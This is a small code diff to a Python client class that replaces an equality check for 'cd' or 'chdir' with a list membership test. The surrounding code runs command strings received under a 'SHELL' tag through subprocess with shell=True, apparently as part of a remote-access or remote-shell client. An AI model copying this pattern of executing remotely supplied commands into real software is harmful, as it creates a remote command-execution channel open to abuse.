@@ -507,7 +507,7 @@ class Client(object):
 
             if data[0] == 'SHELL':
                 split_command = data[1].split(' ')[0].strip().lower()
-                if split_command == 'cd' or split_command == 'chdir':
+                if split_command in ['cd', 'chdir']:
                     process = subprocess.Popen(data[1] + self._pwd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                     error = process.stderr.read().decode()
                     if error == "":
